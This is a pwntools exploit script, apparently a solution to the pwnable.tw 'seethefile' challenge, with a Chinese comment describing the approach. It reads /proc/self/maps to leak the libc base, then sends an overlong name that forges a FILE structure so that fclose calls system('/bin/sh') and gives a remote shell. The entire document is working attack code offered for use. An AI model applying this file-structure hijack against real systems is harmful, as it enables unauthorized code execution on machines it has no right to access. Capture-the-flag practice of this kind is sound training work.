#读/proc/self/maps泄露libc，然后修改fclose结构体
from pwn import *
context.log_level = 'debug'
prog = './seethefile'
elf = ELF(prog)
#p = process(prog)#,env={"LD_PRELOAD":"./libc.so"})
libc = ELF("libc_32.so.6")#/lib/i386-linux-gnu/libc-2.23.so")
p = remote("chall.pwnable.tw", 10200)

def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()
    	
def open(file):
	p.sendlineafter("choice :", '1')
	p.sendlineafter("see :", file)

def read():
	p.sendlineafter("choice :", '2')

def write():
	p.sendlineafter("choice :", '3')

def exit(name):
	p.sendlineafter("choice :", '5')
	p.sendlineafter("name :", name)
def exp():
	open("/proc/self/maps")
	read()
	write()
	read()
	write()
	p.recvline()
	#p.recvunitl("-")
	libc.address = int(p.recvline()[:8], 16)#+0xf7728000-0xf757b000
	log.info("libc.address == >" + hex(libc.address))
	buf = 0x0804b260
	#dbg('b*0x8048b0f')

	payload = '/bin/sh'.ljust(0x20, '\x00')
	payload += p32(buf)
	payload = payload.ljust(0x48, '\x00')
	payload += p32(buf+16)
	payload = payload.ljust(0x94, '\x00')
	payload += p32(0x804b2f8 - 0x44)
	payload += p32(libc.symbols['system'])
	exit(payload)
	#
	p.interactive()
if __name__ == '__main__':
	exp()
